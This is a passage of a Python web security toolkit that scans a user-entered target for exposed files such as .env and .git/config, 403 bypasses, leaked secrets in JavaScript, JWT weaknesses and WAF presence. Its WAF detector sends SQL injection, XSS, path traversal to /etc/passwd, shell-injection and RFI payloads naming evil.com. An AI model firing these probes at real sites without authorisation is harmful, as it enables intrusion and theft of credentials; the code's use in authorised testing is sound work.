                js_links.add(full_url)

        print(f"{Fore.GREEN} [+] Found {len(js_links)} JS files.\n")

        pattern = re.compile(r'''(?:"|')((?:https?:\/\/|\/)[^"'<> ]+?(?:\.php|\.asp|\.aspx|\.jsp|\.json|\/api\/|\/admin\/)[^"'<> ]*)(?:"|')''', re.IGNORECASE)
        results = set()

        for js_url in js_links:
            print(f"{Fore.CYAN} [*] Analyzing: {js_url}")
            try:
                js_resp = requests.get(js_url, headers=headers, timeout=10)
                matches = pattern.findall(js_resp.text)
                for match in matches:
                    results.add(urljoin(js_url, match))
            except requests.RequestException:
                print(f"{Fore.RED} [!] Failed to fetch {js_url}")

        elapsed = round(time.time() - start, 2)
        print(f"\n{Fore.GREEN} [+] Found {len(results)} endpoint(s) in JS files in {elapsed}s:\n")

        if results:
            for i, endpoint in enumerate(sorted(results), 1):
                print(f"{Fore.CYAN} [{i:02}] {Fore.WHITE}{endpoint}")
        else:
            print(f"{Fore.YELLOW} [~] No endpoints matched the pattern.")

    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED} [!] Error: {e}")

    input(f"\n{Fore.YELLOW} Press ENTER to return to menu...")
    main_menu()

def exposed_files_finder():
    clear()
    banner()
    target = input(Fore.CYAN + " [?] Enter target URL: " + Fore.WHITE).strip()
    if not target.startswith("http"):
        target = "http://" + target

    print(f"\n{Fore.CYAN} [?] Use custom wordlist? (y/n): {Fore.WHITE}", end="")
    use_wordlist = input().strip().lower() == 'y'

    if use_wordlist:
        wordlist_path = input(Fore.CYAN + " [?] Path to wordlist file: " + Fore.WHITE).strip()
        try:
            with open(wordlist_path, 'r') as f:
                sensitive_paths = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"{Fore.RED} [!] File not found. Using default paths instead.")
            sensitive_paths = default_paths()
    else:
        sensitive_paths = default_paths()

    headers = {'User-Agent': 'Mozilla/5.0'}

    print(f"{Fore.YELLOW} [~] Scanning {target} for exposed sensitive files...")
    start = time.time()
    found = []

    for path in sensitive_paths:
        url = urljoin(target, path)
        try:
            response = requests.get(url, headers=headers, timeout=8)
            if response.status_code == 200 and any(x in response.text for x in ["root", "DB_", "password", "[core]", "github.com"]):
                print(f"{Fore.RED} [!] Found exposed: {path}")
                print(f"{Fore.WHITE} --- Content Preview ---\n{Fore.LIGHTBLACK_EX}{response.text[:300]}\n")
                found.append(path)
            elif response.status_code == 200:
                print(f"{Fore.YELLOW} [!] {path} accessible, but no sensitive content detected.")
            else:
                print(f"{Fore.GREEN} [-] {path} not found.")
        except requests.RequestException:
            print(f"{Fore.RED} [!] Failed to connect to {url}")

    elapsed = round(time.time() - start, 2)
    print(f"\n{Fore.GREEN} [+] Scan completed in {elapsed}s. {len(found)} potentially exposed files found.")

    input(f"\n{Fore.YELLOW} Press ENTER to return to menu...")
    main_menu()

def default_paths():
    return [
        "/.git/config",
        "/.env",
        "/config/.env",
        "/.DS_Store",
        "/.htpasswd",
        "/.gitignore",
        "/backup.zip",
        "/database.sql",
        "/.env.bak",
        "/.env.old",
        "/.env~",
        "/config.yml"
    ]

def bypass_403_tester():
    clear()
    banner()
    base_url = input(Fore.CYAN + " [?] Enter target URL (e.g., https://example.com/admin): " + Fore.WHITE).strip()
    if not base_url.startswith("http"):
        base_url = "http://" + base_url

    use_wordlist = input(Fore.CYAN + " [?] Use custom path wordlist? (y/n): ").strip().lower() == 'y'
    if use_wordlist:
        wordlist_path = input(Fore.YELLOW + " [~] Enter path to wordlist file: ").strip()
        if not os.path.exists(wordlist_path):
            print(Fore.RED + " [!] Wordlist not found!")
            input(f"\n{Fore.YELLOW} Press ENTER to return to menu...")
            main_menu()
            return
        with open(wordlist_path, 'r') as f:
            payloads = [line.strip() for line in f if line.strip()]
    else:
        payloads = [
            "", "/", "..;/", "/.", "%2e/", "%2e%2e/", "%2f", "..%2f", "%2e%2e%2f", "/%20", "/%09", "/%00"
        ]

    methods = ["GET", "POST", "HEAD", "OPTIONS"]
    headers = {'User-Agent': 'Mozilla/5.0'}

    print(f"{Fore.YELLOW} [~] Checking original access to {base_url} ...")
    try:
        response = requests.get(base_url, headers=headers, timeout=10)
        original_status = response.status_code
        if original_status != 403:
            print(f"{Fore.GREEN} [+] Endpoint returned {original_status}, not 403. Skipping bypass tests.")
            input(f"\n{Fore.YELLOW} Press ENTER to return to menu...")
            main_menu()
            return
    except requests.RequestException as e:
        print(f"{Fore.RED} [!] Error connecting: {e}")
        return

    print(f"\n{Fore.CYAN} [*] Original endpoint returned 403, testing bypasses...\n")
    start = time.time()

    for mod_path in payloads:
        test_url = base_url.rstrip("/") + mod_path
        for method in methods:
            try:
                r = requests.request(method, test_url, headers=headers, timeout=8)
                if r.status_code != 403:
                    print(f"{Fore.GREEN} [!] Bypass success → {method} {mod_path} → {r.status_code}")
                else:
                    print(f"{Fore.LIGHTBLACK_EX} [-] {method} {mod_path} → 403")
            except requests.RequestException:
                print(f"{Fore.RED} [!] Connection failed for {method} {test_url}")

    elapsed = round(time.time() - start, 2)
    print(f"\n{Fore.GREEN} [+] Done in {elapsed}s.")
    input(f"\n{Fore.YELLOW} Press ENTER to return to menu...")
    main_menu()

def jsonp_finder():
    clear()
    banner()
    target = input(Fore.CYAN + " [?] Enter target URL: " + Fore.WHITE).strip()
    if not target.startswith("http"):
        target = "http://" + target

    try:
        headers = {'User-Agent': 'Mozilla/5.0'}
        print(f"{Fore.YELLOW} [~] Sending request to {target} ...")
        start = time.time()

        response = requests.get(target, headers=headers, timeout=10)
        response.raise_for_status()
        elapsed = round(time.time() - start, 2)

        soup = BeautifulSoup(response.text, 'html.parser')
        links = set()

        for tag in soup.find_all(['a', 'script']):
            href = tag.get('href') or tag.get('src')
            if href:
                full = urljoin(target, href)
                if 'callback=' in full:
                    links.add(full)

        if not links:
            print(f"\n{Fore.YELLOW} [!] No potential JSONP links found.")
        else:
            print(f"\n{Fore.GREEN} [+] Found {len(links)} potential JSONP endpoints in {elapsed}s:\n")
            for i, link in enumerate(sorted(links), 1):
                test_url = re.sub(r'callback=[^&]+', 'callback=evilFunc', link)
                try:
                    r = requests.get(test_url, headers=headers, timeout=5)
                    if 'evilFunc' in r.text:
                        vuln = f"{Fore.RED}[VULNERABLE]"
                    else:
                        vuln = f"{Fore.YELLOW}[Not Reflected]"
                except:
                    vuln = f"{Fore.MAGENTA}[Error]"
                print(f"{Fore.CYAN} [{i:02}] {Fore.WHITE}{test_url} {vuln}")

    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED} [!] Error: {e}")

    input(f"\n{Fore.YELLOW} Press ENTER to return to menu...")
    main_menu()

def wayback_url_extractor():
    clear()
    banner()
    target = input(Fore.CYAN + " [?] Enter target domain (e.g., example.com): " + Fore.WHITE).strip()

    if not target:
        print(Fore.RED + " [!] No domain entered.")
        input(f"\n{Fore.YELLOW} Press ENTER to return to menu...")
        main_menu()

    print(f"{Fore.YELLOW} [~] Fetching archived URLs for: {target}")
    start = time.time()

    api_url = f"https://web.archive.org/cdx/search/cdx?url=*.{target}/*&output=json&fl=original&collapse=urlkey"

    try:
        headers = {'User-Agent': 'Mozilla/5.0'}
        res = requests.get(api_url, headers=headers, timeout=10)
        res.raise_for_status()
        data = res.json()

        urls = sorted(set(entry[0] for entry in data[1:]))  # Skip header row
        elapsed = round(time.time() - start, 2)

        print(f"\n{Fore.GREEN} [+] Found {len(urls)} archived URLs in {elapsed}s:\n")
        for i, url in enumerate(urls, 1):
            print(f"{Fore.CYAN} [{i:02}] {Fore.WHITE}{url}")

    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED} [!] Request error: {e}")
    except Exception as e:
        print(f"{Fore.RED} [!] Unexpected error: {e}")

    input(f"\n{Fore.YELLOW} Press ENTER to return to menu...")
    main_menu()

def parameter_pollution_tester():
    clear()
    banner()
    target = input(Fore.CYAN + " [?] Enter target URL with parameters (e.g., http://site.com/page.php?id=1): " + Fore.WHITE).strip()

    if "?" not in target or "=" not in target:
        print(Fore.RED + " [!] URL must contain query parameters (e.g., ?id=1).")
        input(f"\n{Fore.YELLOW} Press ENTER to return to menu...")
        main_menu()

    try:
        headers = {'User-Agent': 'Mozilla/5.0'}
        print(f"{Fore.YELLOW} [~] Sending original request to {target} ...")
        original = requests.get(target, headers=headers, timeout=10)
        original_len = len(original.text)

        parsed = urlparse(target)
        base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        query = parse_qs(parsed.query)

        print(f"{Fore.YELLOW} [~] Found parameters: {', '.join(query.keys())}")
        polluted_urls = []

        for param in query:
            val = query[param][0]
            polluted = f"{base}?{param}={val}&{param}={val}x"
            polluted_urls.append((param, polluted))

        print(f"\n{Fore.GREEN} [+] Testing parameter pollution:\n")
        for i, (param, test_url) in enumerate(polluted_urls, 1):
            try:
                res = requests.get(test_url, headers=headers, timeout=10)
                diff = abs(len(res.text) - original_len)
                indicator = Fore.RED + "[!]" if diff > 20 else Fore.GREEN + "[+]"
                print(f"{Fore.CYAN} [{i:02}] {Fore.WHITE}{test_url} {indicator} {Fore.YELLOW}(diff: {diff} chars)")
            except:
                print(f"{Fore.CYAN} [{i:02}] {Fore.WHITE}{test_url} {Fore.RED}[ERROR]")

    except Exception as e:
        print(f"{Fore.RED} [!] Error: {e}")

    input(f"\n{Fore.YELLOW} Press ENTER to return to menu...")
    main_menu()

def sitemap_robots_parser():
    clear()
    banner()
    target = input(Fore.CYAN + " [?] Enter target URL (e.g., https://example.com): " + Fore.WHITE).strip()
    if not target.startswith("http"):
        target = "http://" + target

    if target.endswith('/'):
        target = target[:-1]

    headers = {'User-Agent': 'Mozilla/5.0'}
    disallowed = []
    allowed = []
    sitemap_urls = []
    sitemap_links = []

    print(f"{Fore.YELLOW} [~] Fetching /robots.txt ...")
    try:
        robots_url = target + "/robots.txt"
        res = requests.get(robots_url, headers=headers, timeout=10)
        if res.status_code == 200:
            lines = res.text.splitlines()
            for line in lines:
                line = line.strip()
                if line.startswith("Disallow:"):
                    path = line.split(":")[1].strip()
                    disallowed.append(path)
                elif line.startswith("Allow:"):
                    path = line.split(":")[1].strip()
                    allowed.append(path)
                elif line.lower().startswith("sitemap:"):
                    sitemap_url = line.split(":", 1)[1].strip()
                    sitemap_urls.append(sitemap_url)
            print(f"{Fore.GREEN} [+] Parsed robots.txt: {len(disallowed)} Disallow, {len(allowed)} Allow, {len(sitemap_urls)} Sitemap(s) found.")
        else:
            print(f"{Fore.RED} [!] robots.txt not found (status code {res.status_code})")
    except Exception as e:
        print(f"{Fore.RED} [!] Failed to fetch robots.txt: {e}")

    for sitemap_url in sitemap_urls or [target + "/sitemap.xml"]:
        print(f"\n{Fore.YELLOW} [~] Fetching sitemap: {sitemap_url}")
        try:
            res = requests.get(sitemap_url, headers=headers, timeout=10)
            if res.status_code == 200 and "<urlset" in res.text:
                urls = re.findall(r"<loc>(.*?)</loc>", res.text)
                sitemap_links.extend(urls)
                print(f"{Fore.GREEN} [+] Found {len(urls)} URLs in sitemap.")
            else:
                print(f"{Fore.RED} [!] Sitemap not valid or empty.")
        except Exception as e:
            print(f"{Fore.RED} [!] Failed to fetch sitemap: {e}")

    if disallowed or allowed or sitemap_links:
        print(f"\n{Fore.GREEN} [+] Results:\n")
        if disallowed:
            print(f"{Fore.CYAN} [Disallowed Paths]:")
            for d in disallowed:
                print(f"  {Fore.RED}- {d}")
        if allowed:
            print(f"\n{Fore.CYAN} [Allowed Paths]:")
            for a in allowed:
                print(f"  {Fore.GREEN}- {a}")
        if sitemap_links:
            print(f"\n{Fore.CYAN} [Sitemap URLs]:")
            for i, url in enumerate(sitemap_links, 1):
                print(f"  {Fore.WHITE}[{i:02}] {url}")
    else:
        print(f"{Fore.YELLOW} [~] No useful data found.")

    input(f"\n{Fore.YELLOW} Press ENTER to return to menu...")
    main_menu()

def js_secrets_finder():
    clear()
    banner()
    target = input(Fore.CYAN + " [?] Enter target URL: " + Fore.WHITE).strip()
    if not target.startswith("http"):
        target = "http://" + target

    headers = {'User-Agent': 'Mozilla/5.0'}
    js_links = set()
    secrets_found = []

    try:
        print(f"{Fore.YELLOW} [~] Fetching page from {target} ...")
        res = requests.get(target, headers=headers, timeout=10)
        res.raise_for_status()
        soup = BeautifulSoup(res.text, 'html.parser')

        # Find all of the <script src="">
        for script in soup.find_all("script"):
            src = script.get("src")
            if src:
                full_url = urljoin(target, src)
                js_links.add(full_url)

        if not js_links:
            print(f"{Fore.RED} [!] No external JavaScript files found.")
            input(f"\n{Fore.YELLOW} Press ENTER to return to menu...")
            main_menu()

        print(f"\n{Fore.GREEN} [+] Found {len(js_links)} JavaScript files:\n")
        for i, link in enumerate(sorted(js_links), 1):
            print(f"{Fore.CYAN} [{i:02}] {Fore.WHITE}{link}")

        # Regex patterns
        patterns = {
            "API Key": r"(?i)(api[_-]?key|key|apikey)[\"'\s:=]+[\"']?[\w\-]{16,45}",
            "Token": r"(?i)(token|auth)[\"'\s:=]+[\"']?[\w\-]{8,64}",
            "Email": r"[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+",
            "Base64": r"[A-Za-z0-9+/]{20,}={0,2}",
            "AWS Key": r"AKIA[0-9A-Z]{16}"
        }

        print(f"\n{Fore.YELLOW} [~] Scanning JS files for secrets...\n")

        for js_url in js_links:
            try:
                js_res = requests.get(js_url, headers=headers, timeout=10)
                js_res.raise_for_status()
                content = js_res.text

                for name, pattern in patterns.items():
                    matches = re.findall(pattern, content)
                    for match in set(matches):
                        secrets_found.append((name, match.strip(), js_url))
                        print(f"{Fore.CYAN} [+] {name}: {Fore.WHITE}{match.strip()}{Fore.YELLOW} (in {js_url})")

            except Exception as e:
                print(f"{Fore.RED} [!] Failed to fetch {js_url}: {e}")

        if not secrets_found:
            print(f"{Fore.YELLOW} [~] No secrets found.")

    except Exception as e:
        print(f"{Fore.RED} [!] Error: {e}")

    input(f"\n{Fore.YELLOW} Press ENTER to return to menu...")
    main_menu()

def host_header_injection():
    clear()
    banner()
    target = input(Fore.CYAN + " [?] Enter target URL: " + Fore.WHITE).strip()
    if not target.startswith("http"):
        target = "http://" + target

    try:
        base_host = urlparse(target).netloc
        rand_host = f"evil{random.randint(1000,9999)}.hhi-test.local"
        headers = {
            'User-Agent': 'Mozilla/5.0',
            'Host': rand_host
        }

        print(f"{Fore.YELLOW} [~] Sending request with fake Host header: {rand_host}")
        start = time.time()

        response = requests.get(target, headers=headers, timeout=10, allow_redirects=True)
        elapsed = round(time.time() - start, 2)

        reflected = rand_host in response.text
        redirected = rand_host in response.url
        status = response.status_code

        print(f"\n{Fore.GREEN} [+] Response received in {elapsed}s with status code {status}.\n")

        if reflected:
            print(f"{Fore.RED} [!] Hostname reflected in response body — possible injection!")
        if redirected:
            print(f"{Fore.RED} [!] Redirection to injected hostname — open redirect or SSRF risk!")
        if not (reflected or redirected):
            print(f"{Fore.YELLOW} [-] No clear signs of Host header injection.")
        
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED} [!] Error: {e}")

    input(f"\n{Fore.YELLOW} Press ENTER to return to menu...")
    main_menu()

def redirect_chain_tracer():
    clear()
    banner()
    target = input(Fore.CYAN + " [?] Enter target URL: " + Fore.WHITE).strip()
    if not target.startswith("http"):
        target = "http://" + target

    try:
        headers = {'User-Agent': 'Mozilla/5.0'}
        print(f"{Fore.YELLOW} [~] Tracing redirect chain for {target} ...")
        start = time.time()

        response = requests.get(target, headers=headers, timeout=10, allow_redirects=True)
        elapsed = round(time.time() - start, 2)

        print(f"\n{Fore.GREEN} [+] Final URL: {response.url}")
        print(f"{Fore.GREEN} [+] Status Code: {response.status_code}")
        print(f"{Fore.GREEN} [+] Redirect Chain ({len(response.history)} steps):\n")

        if response.history:
            for i, resp in enumerate(response.history, 1):
                print(f"{Fore.CYAN} [{i:02}] {Fore.WHITE}{resp.status_code} → {resp.url}")
        else:
            print(f"{Fore.YELLOW} [-] No redirects found.")

        # Bonus: check meta refresh or JS-based redirect
        soup = BeautifulSoup(response.text, 'html.parser')
        meta = soup.find('meta', attrs={"http-equiv": re.compile("^refresh$", re.I)})
        if meta:
            content = meta.get('content', '')
            print(f"\n{Fore.RED} [!] Meta refresh found: {content}")

        js_redirects = re.findall(r'window\.location\.href\s*=\s*["\'](.*?)["\']', response.text)
        if js_redirects:
            print(f"{Fore.RED} [!] JavaScript redirect(s) detected:")
            for js_url in js_redirects:
                print(f"{Fore.WHITE}     → {js_url}")

        print(f"\n{Fore.GREEN} [+] Completed in {elapsed}s.")

    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED} [!] Error: {e}")

    input(f"\n{Fore.YELLOW} Press ENTER to return to menu...")
    main_menu()

def decode_base64url(data):
    rem = len(data) % 4
    if rem > 0:
        data += '=' * (4 - rem)
    return base64.urlsafe_b64decode(data)

def is_valid_jwt(token):
    parts = token.split('.')
    if len(parts) != 3:
        return False
    try:
        header = decode_base64url(parts[0])
        payload = decode_base64url(parts[1])
        json.loads(header)
        json.loads(payload)
        return True
    except:
        return False

def jwt_token_analyzer():
    clear()
    banner()
    target = input(Fore.CYAN + " [?] Enter target URL: " + Fore.WHITE).strip()
    if not target.startswith("http"):
        target = "http://" + target

    try:
        headers = {'User-Agent': 'Mozilla/5.0'}
        print(f"{Fore.YELLOW} [~] Sending request to {target} ...")
        response = requests.get(target, headers=headers, timeout=10)
        response.raise_for_status()

        tokens = []

        # Headers scan
        for header, value in response.headers.items():
            if value.count('.') == 2 and is_valid_jwt(value):
                tokens.append(value)

        # Cookies scan
        for cookie in response.cookies:
            if cookie.value.count('.') == 2 and is_valid_jwt(cookie.value):
                tokens.append(cookie.value)

        if not tokens:
            print(f"{Fore.RED} [!] No valid JWT tokens found in headers or cookies.")
        else:
            print(f"\n{Fore.GREEN} [+] Found {len(tokens)} JWT token(s):\n")
            for i, token in enumerate(tokens, 1):
                print(f"{Fore.CYAN} [{i:02}] {Fore.WHITE}{token}")

                try:
                    header_b64, payload_b64, _ = token.split('.')
                    header = json.loads(decode_base64url(header_b64).decode())
                    payload = json.loads(decode_base64url(payload_b64).decode())

                    print(f"{Fore.YELLOW}  ├─ Header: {json.dumps(header, indent=2)}")
                    print(f"{Fore.YELLOW}  └─ Payload: {json.dumps(payload, indent=2)}")

                    if header.get("alg", "").lower() == "none":
                        print(f"{Fore.RED}  [!] WARNING: alg is 'none' → Potential vulnerability!")

                except Exception as e:
                    print(f"{Fore.RED}  [!] Failed to decode token: {e}")

        print()

    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED} [!] Error: {e}")

    input(f"\n{Fore.YELLOW} Press ENTER to return to menu...")
    main_menu()

def compare_versions(detected, vuln_db):
    from packaging import version
    vulns_found = []

    for name, ver in detected:
        if name in vuln_db:
            for vuln_ver, desc in vuln_db[name].items():
                try:
                    if version.parse(ver) <= version.parse(vuln_ver):
                        vulns_found.append((name, ver, vuln_ver, desc))
                except:
                    continue
    return vulns_found

def cve_version_scanner():
    clear()
    banner()
    target = input(Fore.CYAN + " [?] Enter target URL: " + Fore.WHITE).strip()
    if not target.startswith("http"):
        target = "http://" + target

    try:
        headers = {'User-Agent': 'Mozilla/5.0'}
        print(f"{Fore.YELLOW} [~] Sending request to {target} ...")
        start = time.time()

        response = requests.get(target, headers=headers, timeout=10)
        response.raise_for_status()
        elapsed = round(time.time() - start, 2)

        found_versions = []

        # Headers
        for header, value in response.headers.items():
            match = re.findall(r'([A-Za-z\-]+)/v?([\d\.]+)', value)
            found_versions.extend(match)

        # HTML meta
        soup = BeautifulSoup(response.text, 'html.parser')
        for meta in soup.find_all('meta', attrs={'name': 'generator'}):
            match = re.findall(r'([A-Za-z\s]+)/?v?([\d\.]+)', meta.get('content', ''))
            found_versions.extend((name.strip(), ver) for name, ver in match)

        # JS files
        for script in soup.find_all('script', src=True):
            match = re.findall(r'([a-zA-Z0-9\-_]+)[\.\-_]?v?(\d+\.\d+(?:\.\d+)?)', script['src'])
            found_versions.extend(match)

        unique_found = sorted(set(found_versions))

        print(f"\n{Fore.GREEN} [+] Detected components ({len(unique_found)}):\n")
        for name, ver in unique_found:
            print(f"{Fore.CYAN} [*] {Fore.WHITE}{name} {ver}")

        # Load local vuln database
        with open('vuln_versions.json') as f:
            vuln_db = json.load(f)

        # Compare
        vulns = compare_versions(unique_found, vuln_db)

        if vulns:
            print(f"\n{Fore.RED} [!] Potential vulnerabilities found:\n")
            for name, found_ver, vuln_ver, desc in vulns:
                print(f"{Fore.RED} [!] {name} {found_ver} <= {vuln_ver} → {desc}")
        else:
            print(f"{Fore.GREEN} [+] No known vulnerable versions detected.")

    except Exception as e:
        print(f"{Fore.RED} [!] Error: {e}")

    input(f"\n{Fore.YELLOW} Press ENTER to return to menu...")
    main_menu()

def waf_detector():
    clear()
    banner()
    target = input(Fore.CYAN + " [?] Enter target URL: " + Fore.WHITE).strip()
    if not target.startswith("http"):
        target = "http://" + target

    waf_payloads = [
        "/?id=1' OR '1'='1",                 # SQLi
        "/?q=<script>alert(1)</script>",     # XSS
        "/../../../../etc/passwd",           # LFI
        "/admin.php",                        # Common restricted path
        "/?cmd=ls",                          # Command injection
        "/search.php?query=../../../",       # Directory traversal
        "/?input=|cat /etc/passwd",          # Shell injection
        "/index.php?file=http://evil.com",   # RFI
        "/login?user=admin'--",              # SQL comment
        "/%3Cscript%3Ealert('x')%3C/script%3E" # Encoded XSS
    ]

    headers = {
        'User-Agent': 'Mozilla/5.0',
        'Accept': '*/*'
    }

    print(f"{Fore.YELLOW} [~] Testing for WAF presence...\n")
    time.sleep(1)

    detected = False
    blocked_responses = []

    for i, payload in enumerate(waf_payloads, 1):
        url = target.rstrip('/') + payload
        try:
            response = requests.get(url, headers=headers, timeout=10)
            code = response.status_code

            if code in [403, 406, 429] or "access denied" in response.text.lower():
                print(f"{Fore.RED} [{i:02}] Blocked ({code}) → {url}")
                detected = True
                blocked_responses.append((code, payload))
            else:
                print(f"{Fore.GREEN} [{i:02}] Allowed ({code}) → {url}")
        except requests.exceptions.RequestException as e:
            print(f"{Fore.MAGENTA} [{i:02}] Connection error: {e}")

        time.sleep(0.5)  # small delay between requests

    print("\n" + "-" * 50)
    if detected:
        print(f"{Fore.RED} [!] WAF possibly detected based on blocking behavior!")
    else:
        print(f"{Fore.GREEN} [+] No obvious WAF behavior detected.")

    input(f"\n{Fore.YELLOW} Press ENTER to return to menu...")
    main_menu()

def http_response_time_analyzer():
    clear()
    banner()
    target = input(Fore.CYAN + " [?] Enter target URL: " + Fore.WHITE).strip()
    if not target.startswith("http"):
        target = "http://" + target

    try:
        headers = {'User-Agent': 'Mozilla/5.0'}
        print(f"{Fore.YELLOW} [~] Measuring response times for {target} ...\n")

        timings = []
        for i in range(10):
            try:
                start = time.time()
                response = requests.get(target, headers=headers, timeout=10)
                elapsed = round(time.time() - start, 3)
                timings.append(elapsed)
                code = response.status_code
                print(f"{Fore.CYAN} [{i+1:02}] {Fore.WHITE}Status: {code} | Time: {elapsed}s")
            except requests.exceptions.RequestException as e:
                print(f"{Fore.RED} [{i+1:02}] Request failed: {e}")
                timings.append(None)

            time.sleep(0.5)

        valid_times = [t for t in timings if t is not None]
        if valid_times:
            avg = round(statistics.mean(valid_times), 3)
            stdev = round(statistics.stdev(valid_times), 3) if len(valid_times) > 1 else 0.0
            print(f"\n{Fore.GREEN} [+] Average response time: {avg}s")
            print(f"{Fore.YELLOW} [+] Standard deviation: {stdev}s")

            if stdev > 0.3:
                print(f"{Fore.RED} [!] High timing variation detected → Possible throttling or filtering!")
        else:
            print(f"{Fore.RED} [!] No successful responses to analyze.")

    except Exception as e:
        print(f"{Fore.RED} [!] Error: {e}")

    input(f"\n{Fore.YELLOW} Press ENTER to return to menu...")
    main_menu()

def tool_info_center():
    clear()
    banner()
    
    tools_info = {
        "01": "URL Crawler",
        "02": "Subdomain Finder",
        "03": "CMS Detector",
        "04": "Headers Analyzer",
        "05": "HTTP Request Sender",
        "06": "Form Scanner",
        "07": "SQL Injection Tester",
        "08": "XSS Tester",
        "09": "Open Directory Finder",
        "10": "WordPress Scanner",
        "11": "Port Scanner",
        "12": "LFI/RFI Scanner",
        "13": "CORS Checker",
        "14": "Open Redirect Tester",
        "15": "SSRF Tester",
        "16": "CSP Analyzer",
        "17": "JavaScript Endpoint Scanner",
        "18": "Exposed Files Finder",
        "19": "403 Bypasser",
        "20": "JSONP Callback Scan",
        "21": "Wayback URL Extractor",
        "22": "Parameter Pollution Tester",
        "23": "Sitemap & robots.txt Parser",
        "24": "JavaScript Secrets Finder",
        "25": "Host Header Injection Tester",
        "26": "Redirect Chain Tracer",
        "27": "JWT Token Analyzer",
        "28": "CVE Version Scanner",
        "29": "WAF Detector",
        "30": "HTTP Timing Analyzer"
    }

    print(f"{Fore.CYAN} [::] Available Tools:\n")
    for num, name in tools_info.items():
        print(f"{Fore.CYAN} [{Fore.WHITE}{num}{Fore.CYAN}] {Fore.WHITE}{name}")
    
    extended_info = {
        "01": " URL Crawler:\n  Crawls the target URL and lists all discovered endpoints such as links, forms, scripts, and assets.",
        "02": " Subdomain Finder:\n  Bruteforces common subdomains for a given domain (e.g., admin.example.com).",
        "03": " CMS Detector:\n  Detects content management systems like WordPress, Joomla, or Drupal by looking at URLs, headers, and meta tags.",
        "04": " Headers Analyzer:\n  Sends a request and prints all HTTP response headers and cookies set by the server.",
        "05": " HTTP Request Sender:\n  Custom tool to send GET/POST/PUT/DELETE/etc. requests with optional headers and data.",
        "06": " Form Scanner:\n  Extracts all HTML forms and input fields from the page. Useful for injection point mapping.",
        "07": " SQL Injection Tester:\n  Automatically submits basic SQL payloads into form fields to test for injection vulnerabilities.",
        "08": " XSS Tester:\n  Sends common Cross-Site Scripting payloads in query parameters to check if they get reflected in the response.",
        "09": " Open Directory Finder:\n  Bruteforces directories and file paths to identify exposed folders (like /admin/, /backup/, etc.).",
        "10": " WordPress Scanner:\n  Detects WordPress core version, plugins, themes, and looks for possible CVEs related to them.",
        "11": " Port Scanner:\n  Scans common TCP ports on the target IP/domain to find open services.",
        "12": " LFI/RFI Scanner:\n  Tests parameters for Local/Remote File Inclusion vulnerabilities (e.g., ?page=../../etc/passwd).",
        "13": " CORS Checker:\n  Tests if Cross-Origin Resource Sharing is misconfigured (e.g., reflects arbitrary Origin + credentials).",
        "14": " Open Redirect Tester:\n  Checks for redirection vulnerabilities in parameters like ?redirect= or ?url=.",
        "15": " SSRF Tester:\n  Tests for Server-Side Request Forgery using parameters like ?url= to access internal services.",
        "16": " CSP Analyzer:\n  Analyzes the Content-Security-Policy header and flags insecure directives (e.g., 'unsafe-inline').",
        "17": " JavaScript Endpoint Scanner:\n  Fetches JS files from the site and extracts endpoints (like /api/, .php, etc.) using regex.",
        "18": " Exposed Files Finder:\n  Checks for commonly forgotten files like /.env, /.git/config, /backup.zip, etc.",
        "19": " 403 Bypasser:\n  Tries different encodings and HTTP methods to bypass forbidden directories or endpoints.",
        "20": " JSONP Callback Scan:\n  Checks for JSONP endpoints that reflect a callback function (possible XSS vector).",
        "21": " Wayback URL Extractor:\n  Downloads historical URLs from archive.org (Wayback Machine) for the given domain.",
        "22": " Parameter Pollution Tester:\n  Tests for HTTP Parameter Pollution (?id=1&id=2), which can bypass server logic.",
        "23": " Sitemap & robots.txt Parser:\n  Extracts disallowed or hidden paths from /robots.txt and /sitemap.xml.",
        "24": " JavaScript Secrets Finder:\n  Searches JS files for exposed secrets: API keys, tokens, email addresses, etc.",
        "25": " Host Header Injection Tester:\n  Sends spoofed Host headers to detect misconfigurations or cache poisoning issues.",
        "26": " Redirect Chain Tracer:\n  Follows and logs all redirects (301, 302, meta refresh, JS) to analyze final destination.",
        "27": " JWT Token Analyzer:\n  Finds and decodes JWT tokens in cookies or headers, warns about weak alg like 'none'.",
        "28": " CVE Version Scanner:\n  Detects CMS/software versions and compares them to a local CVE JSON database for known vulnerabilities.",
        "29": " WAF Detector:\n  Sends multiple known payloads and analyzes responses to identify WAF/firewall behavior.",
        "30": " HTTP Timing Analyzer:\n  Measures response delays and irregularities — useful for side-channel and timing-based analysis.",
    }

    choice = input(Fore.CYAN + "\n [?] Enter tool number to learn more (e.g. 04): " + Fore.WHITE).strip().zfill(2)

    if choice in extended_info:
        print(f"\n{Fore.GREEN} [+] Tool {choice} info:\n")
        print(Fore.WHITE + extended_info[choice])
    else:
        print(f"{Fore.RED} [!] No info available for tool {choice}.")

    input(f"\n{Fore.YELLOW} Press ENTER to return to menu...")
    main_menu()

def main_menu():
    clear()
    print('')
    print(rf'{Fore.CYAN}                      __          _______           {Fore.RESET}')
    print(rf'{Fore.CYAN}                      \ \        / /  __ \          {Fore.RESET}')
    print(rf'{Fore.CYAN}                       \ \  /\  / /| |__) |__ _ __  {Fore.RESET}') 
    print(rf"{Fore.CYAN}                        \ \/  \/ / |  ___/ _ \ '_ \ {Fore.RESET}")
    print(rf'{Fore.CYAN}                         \  /\  /  ) (  |  __/ | | |{Fore.RESET}')
    print(rf'{Fore.CYAN}                          \/  \/  (   )  \___|_| |_|{Fore.RESET}')
    print(rf'{Fore.CYAN}                                   \|/               {Fore.RESET}')
    print(rf'{Fore.CYAN}                              Version{Fore.WHITE} 1.0.0              {Fore.RESET}')
    print(f"{Fore.RED}              [{Fore.WHITE}!{Fore.RED}]{Fore.LIGHTWHITE_EX} You are fully responsible for your actions.")
    print(f"{Fore.CYAN}              [{Fore.WHITE}-{Fore.CYAN}]{Fore.WHITE} Author: Cr3zy (https://github.com/Cr3zy-dev){Fore.RESET}")
    print(rf"                  {Fore.CYAN}[{Fore.WHITE}::{Fore.CYAN}] Select A Number From The Menu {Fore.CYAN}[{Fore.WHITE}::{Fore.CYAN}]")
    print('')
